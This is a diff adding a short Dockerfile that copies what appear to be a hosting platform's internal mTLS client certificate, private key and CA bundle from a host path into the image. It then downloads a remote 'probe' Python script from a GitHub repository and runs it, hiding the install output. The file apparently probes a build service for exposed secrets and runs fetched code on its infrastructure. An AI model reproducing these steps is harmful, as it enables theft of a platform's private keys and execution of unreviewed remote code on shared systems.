@@ -1,0 +1,9 @@
+# I67887-a71e42
+FROM alpine:3.20
+RUN echo I67887-a71e42-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl openssl python3 iproute2 xxd >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 25 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i67887.py && echo DL_OK && MARK=I67887-a71e42 timeout 280 python3 /p.py 2>&1 | head -c 40000
+CMD ["sh","-c","sleep 3600"]
